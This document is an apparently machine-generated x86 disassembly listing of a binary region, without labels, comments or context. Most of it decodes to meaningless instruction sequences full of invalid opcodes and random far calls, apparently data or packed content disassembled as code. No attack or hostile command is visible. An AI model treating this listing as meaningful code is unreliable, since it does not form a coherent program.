  422eac:	adc    edi,DWORD PTR [ecx]
  422eae:	js     0x422e71
  422eb0:	idiv   BYTE PTR [ebp+0x53b0636f]
  422eb6:	sub    esi,ebp
  422eb8:	lea    ecx,[ebx]
  422eba:	sub    ah,BYTE PTR [eax-0x39d72201]
  422ec0:	test   DWORD PTR [ecx-0x28465ff2],ecx
  422ec6:	cmp    al,0x0
  422ec8:	add    BYTE PTR [eax],al
  422eca:	add    BYTE PTR [eax],al
  422ecc:	add    BYTE PTR [eax],al
  422ece:	daa    
  422ecf:	push   ecx
  422ed0:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  422eda:	push   eax
  422edb:	out    dx,eax
  422edc:	sub    cl,0x88
  422edf:	fadd   QWORD PTR [ecx]
  422ee1:	add    BYTE PTR [ecx+0x0],ah
  422ee4:	add    BYTE PTR [eax],al
  422ee6:	xchg   esp,ebp
  422ee8:	add    esi,DWORD PTR [esi+0x60]
  422eeb:	xlat   BYTE PTR ds:[ebx]
  422eec:	jge    0x422f09
  422eee:	xchg   edi,eax
  422eef:	cwde   
  422ef0:	retf   0x8894
  422ef3:	sbb    eax,0x9d9091d5
  422ef8:	nop
  422ef9:	inc    eax
  422efa:	popf   
  422efb:	push   cs
  422efc:	ror    BYTE PTR [esp+esi*2+0x58],1
  422f00:	cmc    
  422f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f02:	leave  
  422f03:	test   eax,0x3bab9aa5
  422f08:	sub    edi,DWORD PTR [edi+0x39]
  422f0b:	mov    esp,0x20e49250
  422f10:	jge    0x422ea1
  422f12:	jne    0x422ea3
  422f14:	cmp    ebp,0x54
  422f17:	sub    BYTE PTR ds:0xb2a3bfaa,al
  422f1d:	imul   bp
  422f20:	sub    BYTE PTR ds:0x9d3e8cb8,bl
  422f26:	mov    edx,DWORD PTR [edx-0x12]
  422f29:	xchg   ebx,eax
  422f2a:	gs repz sub al,0x24
  422f2e:	mov    WORD PTR [esi-0x36716c37],es
  422f34:	push   0xfd4aba12
  422f39:	push   edi
  422f3a:	jno    0x422ef2
  422f3c:	in     eax,0x80
  422f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f3f:	ins    BYTE PTR es:[edi],dx
  422f40:	inc    edx
  422f41:	or     BYTE PTR [ecx],ch
  422f43:	in     al,0x51
  422f45:	pop    es
  422f46:	repnz add BYTE PTR [eax],al
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    BYTE PTR [eax],al
  422f4d:	add    BYTE PTR [edi],ah
  422f4f:	ss lahf 
  422f51:	xor    DWORD PTR [edi+0x1536afb9],ebx
  422f57:	and    eax,0xd0fc075b
  422f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f5d:	enter  0xdce9,0x1
  422f61:	add    BYTE PTR [ecx+0x0],ah
  422f64:	add    BYTE PTR [eax],al
  422f66:	sub    eax,0x4d30a578
  422f6b:	mov    ah,0xb
  422f6d:	repz push esi
  422f6f:	mov    bl,0x33
  422f71:	test   al,0xb2
  422f73:	popf   
  422f74:	in     al,0xbe
  422f76:	rol    ah,1
  422f78:	out    dx,al
  422f79:	sub    BYTE PTR [edx+0x6d],bl
  422f7c:	in     eax,dx
  422f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f7e:	lahf   
  422f7f:	outs   dx,DWORD PTR ds:[esi]
  422f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f81:	ror    ch,cl
  422f83:	stos   DWORD PTR es:[edi],eax
  422f84:	popf   
  422f85:	pusha  
  422f86:	ja     0x422f1a
  422f88:	mov    cl,0x49
  422f8a:	inc    esp
  422f8b:	add    eax,ecx
  422f8d:	inc    edi
  422f8e:	les    esp,FWORD PTR [ecx+0x7]
  422f91:	or     bh,BYTE PTR [ebx+ecx*8]
  422f94:	cli    
  422f95:	lods   al,BYTE PTR ds:[esi]
  422f96:	cld    
  422f97:	and    bl,BYTE PTR [edi+ecx*2-0x2928f2f1]
  422f9e:	adc    edi,DWORD PTR [eax-0x6c]
  422fa1:	out    dx,eax
  422fa2:	or     ecx,DWORD PTR [eax]
  422fa4:	pop    edx
  422fa5:	push   edx
  422fa6:	shl    BYTE PTR ds:0xf1e8e618,cl
  422fac:	ja     0x422f6a
  422fae:	add    esp,edx
  422fb0:	jle    0x422f70
  422fb2:	pop    esi
  422fb3:	leave  
  422fb4:	xor    esp,DWORD PTR [eax]
  422fb6:	jns    0x423017
  422fb8:	(bad)  
  422fb9:	call   0x48ba6991
  422fbe:	push   esi
  422fbf:	adc    al,0x8a
  422fc1:	sbb    esi,edx
  422fc3:	jmp    0x0:0xd9df20
  422fca:	add    BYTE PTR [eax],al
  422fcc:	add    BYTE PTR [eax],al
  422fce:	aaa    
  422fcf:	(bad)  
  422fd0:	out    0xc2,eax
  422fd2:	mul    ebx
  422fd4:	aaa    
  422fd5:	cmc    
  422fd6:	xchg   ecx,eax
  422fd7:	call   0xb77a:0xefceef4
  422fde:	dec    edx
  422fdf:	fld    QWORD PTR [ecx]
  422fe1:	add    BYTE PTR [ecx+0x0],ah
  422fe4:	add    BYTE PTR [eax],al
  422fe6:	adc    edi,DWORD PTR [ecx-0x17]
  422fe9:	mov    ecx,0x45d15933
  422fee:	mov    ecx,?
  422ff0:	fcomip st,st(2)
  422ff2:	sub    BYTE PTR [esi-0x42],0x8d
  422ff6:	jne    0x42306f
  422ff8:	xchg   edi,eax
  422ff9:	dec    edx
  422ffa:	std    
  422ffb:	adc    DWORD PTR [esi+0x62012546],edi
  423001:	xor    eax,0xadd73af6
  423006:	enter  0xfe02,0x11
  42300a:	or     eax,esp
  42300c:	sbb    bl,ah
  42300e:	inc    ebx
  42300f:	aam    0x97
  423011:	cmp    esp,DWORD PTR [ebp+0x60]
  423014:	jmp    0x423082
  423016:	popf   
  423017:	jns    0x423088
  423019:	call   0x2e37fef
  42301e:	clc    
  42301f:	lods   eax,DWORD PTR ds:[esi]
  423020:	ret    
  423021:	icebp  
  423022:	shr    dh,1
  423024:	mov    fs,WORD PTR [ebx]
  423026:	(bad)  
  423027:	test   BYTE PTR [ebp-0xc39210f],bh
  42302d:	mov    eax,ds:0x2dd2ab70
  423032:	in     eax,0xf8
  423034:	loop   0x4230a9
  423036:	inc    esi
  423037:	ja     0x4230ab
  423039:	test   eax,0x4d781f07
  42303e:	mov    al,ds:0x15c2ce37
  423043:	or     al,0x9a
  423045:	and    esp,DWORD PTR [edi+0x0]
  423048:	add    BYTE PTR [eax],al
  42304a:	add    BYTE PTR [eax],al
  42304c:	add    BYTE PTR [eax],al
  42304e:	push   ss
  42304f:	aad    0xdf
  423051:	out    dx,eax
  423052:	fucomip st,st(7)
  423054:	ss std 
  423056:	cmp    BYTE PTR [esi+0x136f5f3a],al
  42305c:	xor    dh,dh
  42305e:	stos   DWORD PTR es:[edi],eax
  42305f:	fld    QWORD PTR [ecx]
  423061:	add    BYTE PTR [ecx+0x0],ah
  423064:	add    BYTE PTR [eax],al
  423066:	cmp    BYTE PTR [ecx+0x74],0xce
  42306a:	jecxz  0x42305f
  42306c:	xor    bh,BYTE PTR [ecx-0xe]
  42306f:	xchg   BYTE PTR [ecx+ecx*8-0x3c],bl
  423073:	ret    0x5032
  423076:	cmp    al,0x11
  423078:	loopne 0x4230ed
  42307a:	loopne 0x423094
  42307c:	adc    al,0xf9
  42307e:	push   0x93753bc8
  423083:	popa   
  423084:	mov    al,0xdc
  423086:	repz adc BYTE PTR [ebp+esi*4-0x1f],cl
  42308b:	stc    
  42308c:	adc    al,0xa6
  42308e:	jo     0x4230a4
  423090:	push   esi
  423091:	mov    cl,0x4e
  423093:	pop    edx
  423094:	sbb    eax,ebx
  423096:	rcr    BYTE PTR [eax],0xbc
  423099:	jb     0x4230ed
  42309b:	sbb    eax,0x3825375e
  4230a0:	sahf   
  4230a1:	call   0xfea4:0x69d64325
  4230a8:	add    eax,0x1b3db8a4
  4230ad:	dec    ebx
  4230ae:	jl     0x4230f4
  4230b0:	pop    edx
  4230b1:	mov    BYTE PTR [edx+esi*4],bh
  4230b4:	stos   BYTE PTR es:[edi],al
  4230b5:	sbb    al,0x4e
  4230b7:	or     esp,esi
  4230b9:	ja     0x423093
  4230bb:	or     DWORD PTR [esi+ecx*4-0x6015e026],0x1c
  4230c3:	cmp    edx,DWORD PTR [ebx-0x66]
  4230c6:	jge    0x4230c8
  4230c8:	add    BYTE PTR [eax],al
  4230ca:	add    BYTE PTR [eax],al
  4230cc:	add    BYTE PTR [eax],al
  4230ce:	outs   dx,BYTE PTR ds:[esi]
  4230cf:	jbe    0x4230b5
  4230d1:	retf   0xdafc
  4230d4:	outs   dx,BYTE PTR ds:[esi]
  4230d5:	neg    BYTE PTR [eax]
  4230d7:	xchg   edx,eax
  4230d8:	xchg   DWORD PTR [edi+0x5d5510ff],edx
  4230de:	or     al,0xde
  4230e0:	add    DWORD PTR [eax],eax
  4230e2:	popa   
  4230e3:	add    BYTE PTR [eax],al
  4230e5:	add    BYTE PTR [ecx+0x27],dl
  4230e8:	or     al,0x8e
  4230ea:	xchg   sp,sp
  4230ed:	push   edx
  4230ee:	das    
  4230ef:	test   al,0xb
  4230f1:	mov    bl,0xfb
  4230f3:	ds xchg esp,eax
  4230f5:	dec    ebp
  4230f6:	xchg   BYTE PTR [eax-0x5b],ah
  4230f9:	jns    0x42312a
  4230fb:	adc    al,cl
  4230fd:	mov    DWORD PTR [eax+ebp*4+0x32],esp
  423101:	mov    ebp,DWORD PTR [eax+0x58]
  423104:	dec    edi
  423105:	sar    DWORD PTR [edi+0x180ff8],1
  42310b:	cld    
  42310c:	pop    edi
  42310d:	lds    eax,FWORD PTR [edi+0x554357c0]
  423113:	inc    eax
  423114:	sbb    esi,esi
  423116:	mov    DWORD PTR [edx+0x14c6f044],edx
  42311c:	in     al,dx
  42311d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42311e:	xor    BYTE PTR [eax+0x31f4183a],0x1b
  423125:	inc    ecx
  423126:	call   0x6bc18de9
  42312b:	sbb    eax,0x7456cd18
  423130:	call   0xeb3d:0x98a95b31
  423137:	(bad)  
  423138:	jg     0x423108
  42313a:	or     eax,0x8bb3e570
  42313f:	ja     0x423113
  423141:	cs jbe 0x42318f
  423144:	pop    edi
  423145:	inc    eax
  423146:	sub    DWORD PTR [eax],eax
  423148:	add    BYTE PTR [eax],al
  42314a:	add    BYTE PTR [eax],al
  42314c:	add    BYTE PTR [eax],al
  42314e:	cmp    dl,BYTE PTR [edx-0x3c]
  423151:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  423158:	nop
  423159:	shl    DWORD PTR ds:0x6d4606e0,cl
  42315f:	fiadd  WORD PTR [ecx]
  423161:	add    BYTE PTR [ecx+0x0],ah
  423164:	add    BYTE PTR [eax],al
  423166:	add    BYTE PTR [edi],dl
  423168:	jle    0x4231c6
  42316a:	aad    0x6d
  42316c:	xlat   BYTE PTR ds:[ebx]
  42316d:	fcomi  st,st(4)
  42316f:	adc    eax,eax
  423171:	push   ebx
  423172:	dec    ecx
  423173:	push   ss
  423174:	(bad)  ds:0xad81ede1
  42317a:	(bad)  
  42317b:	jae    0x42318b
  42317d:	clc    
  42317e:	adc    esp,ebp
  423180:	mov    ebx,ebp
  423182:	loop   0x4231c2
  423184:	cmp    al,0x22
  423186:	aaa    
  423187:	mov    ebp,0x7710c5c1
  42318c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318d:	dec    edi
  42318e:	sar    eax,cl
  423190:	and    DWORD PTR [edi-0x71733936],0xd309a6a3
  42319a:	(bad)  [ebx-0x9]
  42319d:	in     al,0x62
  42319f:	mov    bh,0x5c
  4231a1:	out    dx,al
  4231a2:	ror    cl,0x74
  4231a5:	xor    eax,0xa6d42d1
  4231aa:	mov    al,ds:0x498be776
  4231af:	or     ebp,esi
  4231b1:	loop   0x423176
  4231b3:	cmp    DWORD PTR [ecx+ebx*2-0x17],ebx
  4231b7:	in     al,0x6b
  4231b9:	mov    db6,edx
  4231bc:	or     bh,0xa7
  4231bf:	mov    esi,0x8e72f0b4
  4231c4:	or     al,0xa1
  4231c6:	in     eax,dx
  4231c7:	add    BYTE PTR [eax],al
  4231c9:	add    BYTE PTR [eax],al
  4231cb:	add    BYTE PTR [eax],al
  4231cd:	add    BYTE PTR [ebx-0x4293427d],dl
  4231d3:	jle    0x4231a8
  4231d5:	call   DWORD PTR [eax-0x20]
  4231d8:	cli    
  4231d9:	call   0xdece:0xf2aad2e3
  4231e0:	add    DWORD PTR [eax],eax
  4231e2:	popa   
  4231e3:	add    BYTE PTR [eax],al
  4231e5:	add    BYTE PTR [ebx],bl
  4231e7:	xchg   ecx,eax
  4231e8:	xchg   esp,eax
  4231e9:	ins    BYTE PTR es:[edi],dx
  4231ea:	adc    al,0x6c
  4231ec:	jns    0x4231b2
  4231ee:	mov    cl,0x25
  4231f0:	fnstcw WORD PTR [esi+0x657ff580]
  4231f6:	mov    edx,0xf2a97c2c
  4231fb:	cmp    ah,BYTE PTR [edx+ecx*4-0x54]
  4231ff:	dec    esp
  423200:	stc    
  423201:	push   ds
  423202:	pop    ds
  423203:	les    eax,FWORD PTR [esi-0x10]
  423206:	out    dx,al
  423207:	int    0xae
  423209:	dec    edi
  42320a:	mov    dh,0x8a
  42320c:	pushf  
  42320d:	push   DWORD PTR [ebx+0x63537a57]
  423213:	jns    0x423221
  423215:	ds pop es
  423217:	sbb    al,0x69
  423219:	jns    0x423217
  42321b:	cld    
  42321c:	jmp    0x2663:0xc41a52a2
  423223:	dec    ebp
  423224:	and    eax,0xc30b1c50
  423229:	sub    al,0xe2
  42322b:	adc    eax,0x9332c8e4
  423230:	push   0x26
  423232:	(bad)  
  423233:	popa   
  423234:	pop    ebp
  423235:	cli    
  423236:	jl     0x42327d
  423238:	push   esi
  423239:	clc    
  42323a:	mov    dl,0x85
  42323c:	arpl   di,bx
  42323e:	mov    ebx,0x1fc735e2
  423243:	std    
  423244:	lock add WORD PTR [eax],ax
  423248:	add    BYTE PTR [eax],al
  42324a:	add    BYTE PTR [eax],al
  42324c:	add    BYTE PTR [eax],al
  42324e:	(bad)  
  423250:	test   eax,0xddffeef7
  423256:	and    al,0x1
  423258:	pop    ebp
  423259:	dec    edi
  42325a:	(bad)  [esi-0x20d0cba9]
  423260:	add    DWORD PTR [eax],eax
  423262:	popa   
  423263:	add    BYTE PTR [eax],al
  423265:	add    cl,al
  423267:	popf   
  423268:	push   cs
  423269:	sub    esi,DWORD PTR [ecx]
  42326b:	add    eax,0xe1130476
  423270:	nop
  423271:	xchg   edi,eax
  423272:	das    
  423273:	jno    0x4232f0
  423275:	jmp    0x423293
  423277:	imul   edx,ebp,0xb8dde9f9
  42327d:	cmp    BYTE PTR [eax+0x3f],ch
  423280:	ins    WORD PTR es:[edi],dx
  423282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423283:	lods   eax,DWORD PTR ds:[esi]
  423284:	std    
  423285:	sub    dh,BYTE PTR [ecx+edx*8-0x1f37ebfb]
  42328c:	sbb    BYTE PTR [ebx-0x3fc07f03],al
  423292:	fs popw ss
  423295:	fiadd  WORD PTR cs:[edx]
  423298:	push   ebx
  423299:	adc    eax,0x9703a602
  42329e:	into   
  42329f:	mov    edi,DWORD PTR [eax]
  4232a1:	aam    0x88
  4232a3:	mov    ah,0xec
  4232a5:	pop    es
  4232a6:	int3   
  4232a7:	or     al,0x69
  4232a9:	mov    eax,?
  4232ab:	push   esp
  4232ac:	sbb    BYTE PTR [eax],cl
  4232ae:	imul   BYTE PTR [ecx-0x62a5efcf]
  4232b4:	stos   DWORD PTR es:[edi],eax
  4232b5:	push   ecx
  4232b6:	push   es
  4232b7:	test   eax,0x23897e3c
  4232bc:	dec    edx
  4232bd:	outs   dx,DWORD PTR ds:[esi]
  4232be:	jge    0x423320
  4232c0:	lock mov al,BYTE PTR [ebx-0x65]
  4232c4:	push   ecx
  4232c5:	shr    eax,cl
  4232c7:	add    BYTE PTR [eax],al
  4232c9:	add    BYTE PTR [eax],al
  4232cb:	add    BYTE PTR [eax],al
  4232cd:	add    BYTE PTR [edi-0x5e],ch
  4232d0:	aam    0x2a
  4232d2:	fnstsw WORD PTR [esi-0x1]
  4232d5:	out    0x52,eax
  4232d7:	fcmovu st,st(5)
  4232d9:	in     eax,0xe6
  4232db:	pop    edi
  4232dc:	out    dx,al
  4232dd:	ja     0x42326f
  4232df:	fild   WORD PTR [ecx]
  4232e1:	add    BYTE PTR [ecx+0x0],ah
  4232e4:	add    BYTE PTR [eax],al
  4232e6:	mov    BYTE PTR [ebx-0x1],bl
  4232e9:	or     bh,BYTE PTR [esi-0x5d]
  4232ec:	inc    esi
  4232ed:	push   esp
  4232ee:	inc    ebp
  4232ef:	(bad)  
  4232f1:	jns    0x4232c7
  4232f3:	retf   
  4232f4:	inc    esi
  4232f5:	xchg   DWORD PTR [edx],esp
  4232f7:	dec    edx
  4232f8:	mov    bh,0x68
  4232fa:	mov    edx,0x3fab8811
  4232ff:	cmp    BYTE PTR [esi-0x3b],cl
  423302:	lods   eax,DWORD PTR ds:[esi]
  423303:	jg     0x42337a
  423305:	test   eax,0xfb11ebaf
  42330a:	loopne 0x423346
  42330c:	das    
  42330d:	mov    al,ds:0x6e4a3164
  423312:	and    BYTE PTR [edi-0x75],al
  423315:	pop    ebp
  423316:	mov    ch,0x23
  423318:	mov    ch,0xe9
  42331a:	xchg   edi,eax
  42331b:	jp     0x423369
  42331d:	imul   ebx,DWORD PTR [eax],0xfffffff1
  423320:	rcl    BYTE PTR ss:[edx],cl
  423323:	mov    ebp,0xda78e4f2
  423328:	(bad)  
  423329:	popa   
  42332a:	repz jle 0x423372
  42332d:	pop    esi
  42332e:	pop    ss
  42332f:	dec    ecx
  423330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423331:	inc    ebp
  423332:	xor    DWORD PTR [eax],ebx
  423334:	rcl    BYTE PTR [esp+edi*2-0x388d0dff],0xb5
  42333c:	xlat   BYTE PTR ds:[ebx]
  42333d:	fcomp  st(7)
  42333f:	push   ebp
  423340:	lods   al,BYTE PTR ds:[esi]
  423341:	jns    0x4233bc
  423343:	xor    ebx,DWORD PTR [edi+edx*4+0x3]
  423347:	add    BYTE PTR [eax],al
  423349:	add    BYTE PTR [eax],al
  42334b:	add    BYTE PTR [eax],al
  42334d:	add    cl,bh
  42334f:	sbb    al,al
  423351:	inc    esi
  423352:	jecxz  0x423332
  423354:	(bad)  
  423355:	mov    edi,0xe1f1bc83
  42335a:	icebp  
  42335b:	(bad)  
  42335c:	push   ebx
  42335d:	clc    
  42335e:	icebp  
  42335f:	fild   WORD PTR [ecx]
  423361:	add    BYTE PTR [ecx+0x0],ah
  423364:	add    BYTE PTR [eax],al
  423366:	shl    DWORD PTR [esi],1
  423368:	fs inc edi
  42336a:	nop
  42336b:	mov    bh,0x40
  42336d:	test   BYTE PTR [edi],al
  42336f:	mov    esi,0x1e034ae6
  423374:	repz pop esi
  423376:	sbb    DWORD PTR [ebx+0x29],ebp
  423379:	sub    al,ah
  42337b:	cmp    ah,0x75
  42337e:	(bad)  
  42337f:	xchg   ecx,eax
  423380:	ficomp DWORD PTR ds:0x1f1092f6
  423386:	xor    esp,DWORD PTR [esi]
  423388:	fstp   QWORD PTR [ebx-0x62fad3c0]
  42338e:	dec    esp
  42338f:	inc    ebx
  423390:	shr    BYTE PTR [ebx-0x77],1
  423393:	mov    ch,0xaf
  423395:	stc    
  423396:	xor    esp,ecx
  423398:	cmp    eax,0xbbb4e365
  42339d:	mov    edi,esi
  42339f:	add    DWORD PTR [ebx-0x57],esi
  4233a2:	dec    esp
  4233a3:	pop    ss
  4233a4:	sbb    edi,DWORD PTR ds:0xe1187ce2
  4233aa:	leave  
  4233ab:	rcl    BYTE PTR [edx-0x6e],cl
  4233ae:	or     eax,0xb9c2b48c
  4233b3:	sbb    ah,BYTE PTR [ecx]
  4233b5:	stos   DWORD PTR es:[edi],eax
  4233b6:	int3   
  4233b7:	xchg   edi,eax
  4233b8:	sbb    dl,BYTE PTR [esi+0x424c7d39]
  4233be:	repnz aad 0xba
  4233c1:	jnp    0x4233c2
  4233c3:	mov    esp,0x99b391
  4233c8:	add    BYTE PTR [eax],al
  4233ca:	add    BYTE PTR [eax],al
  4233cc:	add    BYTE PTR [eax],al
  4233ce:	mov    eax,ds:0x3e8336b9
  4233d3:	(bad)  
  4233d4:	mov    ch,0xbb
  4233d6:	icebp  
  4233d7:	and    eax,0xf0448c27
  4233dc:	into   
  4233dd:	aad    0x52
  4233df:	loopne 0x4233e2
  4233e1:	add    BYTE PTR [ecx+0x0],ah
  4233e4:	add    BYTE PTR [eax],al
  4233e6:	push   esp
  4233e7:	add    DWORD PTR [ebx+0x5fb910cf],ecx
  4233ed:	or     eax,0xadd1451b
  4233f2:	jno    0x423439
  4233f4:	sbb    al,0x43
  4233f6:	in     al,dx
  4233f7:	in     eax,0xfc
  4233f9:	dec    edx
  4233fa:	das    
  4233fb:	fld    DWORD PTR [esp+eax*1]
  4233fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233ff:	push   ebp
  423400:	fs cli 
  423402:	xchg   ebx,eax
  423403:	mov    eax,0x3ce725bc
  423408:	mov    edi,0xc450ba4
  42340d:	jbe    0x423409
  42340f:	paddd  mm5,mm2
  423412:	pushf  
  423413:	(bad)
  423416:	lea    edi,[esi-0x18]
  423419:	jno    0x4233e5
  42341b:	inc    BYTE PTR [ecx+0x510e6507]
  423421:	push   eax
  423422:	push   eax
  423423:	lea    ecx,[esi]
  423425:	(bad)  
  423426:	dec    edi
  423427:	imul   esi,DWORD PTR [esi+0x68],0x8aa85969
  42342e:	aam    0x44
  423430:	mov    esp,0x2ba81329
  423435:	or     dl,BYTE PTR [eax+0x7f]
  423438:	push   eax
  423439:	fmulp  st(4),st
  42343b:	ds mov ebp,0xb8969184
  423441:	dec    esi
  423442:	gs repz inc ebp
  423445:	rcl    DWORD PTR [esi],1
  423447:	add    BYTE PTR [eax],al
  423449:	add    BYTE PTR [eax],al
  42344b:	add    BYTE PTR [eax],al
  42344d:	add    BYTE PTR [edx],dl
  42344f:	xlat   BYTE PTR ds:[ebx]
  423450:	repz or esi,edi
  423453:	das    
  423454:	cli    
  423455:	fist   WORD PTR [ecx]
  423457:	dec    ebx
  423458:	es nop
  42345a:	pop    es
  42345b:	jg     0x4234bd
  42345d:	dec    ecx
  42345e:	mov    bl,0xe0
  423460:	add    DWORD PTR [eax],eax
  423462:	popa   
  423463:	add    BYTE PTR [eax],al
  423465:	add    ch,bh
  423467:	mov    ch,BYTE PTR [ebx]
  423469:	out    dx,al
  42346a:	cs sub ch,dl
  42346d:	sbb    eax,0xe42046e7
  423472:	push   ebx
  423473:	retf   
  423474:	push   edi
  423475:	sub    eax,0x5e8dd7df
  42347a:	fnsave [ebx]
  42347c:	test   DWORD PTR [eax+edi*1+0x24535e39],esp
  423483:	clc    
  423484:	cmp    ch,bh
  423486:	mov    cl,0x90
  423488:	std    
  423489:	mov    al,0x71
  42348b:	cli    
  42348c:	mov    dh,BYTE PTR [edx+0x2]
  42348f:	imul   eax,DWORD PTR [edx+ecx*1-0x65],0x7d
  423494:	leave  
  423495:	fsub   st(6),st
  423497:	into   
  423498:	rcr    edx,cl
  42349a:	xchg   edx,eax
  42349b:	idiv   BYTE PTR [ebx+0x3d6017a9]
  4234a1:	out    dx,eax
  4234a2:	and    dh,bl
  4234a4:	dec    ecx
  4234a5:	stos   DWORD PTR es:[edi],eax
  4234a6:	addr16 jo 0x423444
  4234a9:	pop    edx
  4234aa:	(bad)  
  4234ab:	and    ch,BYTE PTR [ebx-0x6a]
  4234ae:	lea    ecx,[esi-0x62d56605]
  4234b4:	mov    dl,0x96
  4234b6:	imul   BYTE PTR [esi]
  4234b8:	daa    
  4234b9:	mov    dh,0xf2
  4234bb:	push   esp
  4234bc:	frstor cs:[ecx]
  4234bf:	or     BYTE PTR [edx-0x6ff0530c],al
  4234c5:	in     al,0xf7
	...
  4234cf:	rol    BYTE PTR [edx+0x0],0x4
  4234d3:	rol    BYTE PTR [edx+0x0],0x8
  4234d7:	rol    BYTE PTR [edx+0x0],0xc
  4234db:	rol    BYTE PTR [edx+0x0],0x10
  4234df:	rol    BYTE PTR [edx+0x0],0x14
  4234e3:	rol    BYTE PTR [edx+0x0],0x18
  4234e7:	rol    BYTE PTR [edx+0x0],0x1c
  4234eb:	rol    BYTE PTR [edx+0x0],0x57
  4234ef:	inc    edi
  4234f0:	cmp    DWORD PTR [edi+0x41],ebx
  4234f3:	pop    eax
  4234f4:	ss push esi
  4234f6:	pop    edi
  4234f7:	cmp    BYTE PTR [eax],al
  4234f9:	inc    ebx
  4234fa:	inc    ebp
  4234fb:	dec    esp
  4234fc:	pop    edi
  4234fd:	pop    eax
  4234fe:	push   edi
  4234ff:	dec    eax
  423500:	inc    edx
  423501:	add    BYTE PTR [edi+0x50],dl
  423504:	xor    eax,0x4641365f
  423509:	cmp    DWORD PTR [edx],esi
  42350b:	xor    ebx,DWORD PTR [edi+0x32]
  42350e:	aaa    
  42350f:	add    BYTE PTR [eax+0x48],dl
  423512:	xor    BYTE PTR [edi+0x58],bl
  423515:	push   esp
  423516:	inc    ecx
  423517:	dec    ebp
  423518:	push   ecx
  423519:	pop    edi
  42351a:	inc    esi
  42351b:	push   ebp
  42351c:	cmp    DWORD PTR [eax],eax
  42351e:	push   edi
  42351f:	push   ebp
  423520:	inc    ecx
  423521:	xor    dh,BYTE PTR [ebx]
  423523:	xor    ebx,DWORD PTR [edi+0x4e]
  423526:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42352a:	cmp    DWORD PTR [edi+0x38],ebx
  42352d:	dec    ecx
  42352e:	cmp    DWORD PTR [edx+0x36],ebx
  423531:	pop    edi
  423532:	dec    edx
  423533:	xor    BYTE PTR [edx+0x34],cl
  423536:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42353a:	xor    esi,DWORD PTR [eax]
  42353c:	pop    edi
  42353d:	inc    edx
  42353e:	dec    ebx
  42353f:	pop    eax
  423540:	pop    eax
  423541:	xor    eax,0x51414d00
  423546:	pop    edi
  423547:	inc    ecx
  423548:	xor    al,BYTE PTR [ebp+0x5f]
  42354b:	inc    ecx
  42354c:	dec    ebx
  42354d:	cmp    DWORD PTR ds:0x5a003939,esi
  423553:	inc    ebp
  423554:	cmp    BYTE PTR [edi+0x4d],bl
  423557:	ss dec eax
  423559:	dec    ebx
  42355a:	add    BYTE PTR [ebp+0x57],al
  42355d:	xor    DWORD PTR [edi+0x31],ebx
  423560:	dec    ebx
  423561:	xor    eax,DWORD PTR [ecx+0x30]
  423564:	push   ebx
  423565:	add    BYTE PTR [edx+esi*1+0x36],al
  423569:	aaa    
  42356a:	pop    edi
  42356b:	push   edx
  42356c:	dec    eax
  42356d:	dec    ebp
  42356e:	cmp    BYTE PTR [edi+0x37],bl
  423571:	inc    esi
  423572:	xor    eax,0x43355500
  423577:	pop    edi
  423578:	pop    ecx
  423579:	dec    ecx
  42357a:	push   ebx
  42357b:	xor    bl,BYTE PTR [edi+0x52]
  42357e:	add    BYTE PTR [eax+0x55],dl
  423581:	dec    ecx
  423582:	xor    BYTE PTR [edi+0x43],bl
  423585:	ss inc ebp
  423587:	xor    bl,BYTE PTR [edi+0x4d]
  42358a:	xor    al,0x4a
  42358c:	push   edx
  42358d:	push   ebp
  42358e:	add    BYTE PTR [esi+0x39],cl
  423591:	push   eax
  423592:	pop    edi
  423593:	push   ebp
  423594:	cmp    DWORD PTR [esi],esi
  423596:	xor    BYTE PTR [ecx],dh
  423598:	pop    edi
  423599:	dec    edi
  42359a:	dec    esi
  42359b:	push   esp
  42359c:	cmp    BYTE PTR [eax],al
  42359e:	dec    esp
  42359f:	xor    al,0x44
  4235a1:	xor    DWORD PTR [edi+0x4b],ebx
  4235a4:	xor    DWORD PTR [ebp+0x5f],eax
  4235a7:	pop    edx
  4235a8:	add    BYTE PTR [edi+esi*1+0x43],dl
  4235ac:	pop    edi
  4235ad:	inc    edx
  4235ae:	xor    dh,BYTE PTR [ecx]
  4235b0:	push   ebx
  4235b1:	xor    DWORD PTR [ecx],edi
  4235b3:	inc    edx
  4235b4:	add    BYTE PTR [edi+0x45],al
  4235b7:	xor    al,0x38
  4235b9:	xor    BYTE PTR [eax],dh
  4235bb:	pop    edi
  4235bc:	dec    edx
  4235bd:	dec    ebx
  4235be:	xor    eax,0x33345f4d
  4235c3:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4235c7:	pop    edi
  4235c8:	aaa    
  4235c9:	push   esi
  4235ca:	dec    ebx
  4235cb:	push   edx
  4235cc:	pop    edi
  4235cd:	inc    ebx
  4235ce:	add    BYTE PTR [edx+0x35],bl
  4235d1:	dec    ebp
  4235d2:	pop    edi
  4235d3:	inc    edi
  4235d4:	dec    esi
  4235d5:	xor    al,0x49
  4235d7:	xor    eax,0x54590035
  4235dc:	push   edx
  4235dd:	pop    edi
  4235de:	push   esp
  4235df:	inc    ebx
  4235e0:	inc    ecx
  4235e1:	pop    edi
  4235e2:	cmp    DWORD PTR [ecx+0x41],ebx
  4235e5:	push   ebp
  4235e6:	pop    edi
  4235e7:	push   ebp
  4235e8:	inc    ebp
  4235e9:	add    BYTE PTR [esi+esi*1+0x35],cl
  4235ed:	pop    edi
  4235ee:	pop    eax
  4235ef:	dec    edx
  4235f0:	inc    edx
  4235f1:	inc    edi
  4235f2:	add    BYTE PTR [edx+0x36],al
  4235f5:	inc    ebx
  4235f6:	pop    edi
  4235f7:	xor    BYTE PTR ds:0x36464b,dh
  4235fd:	dec    ebx
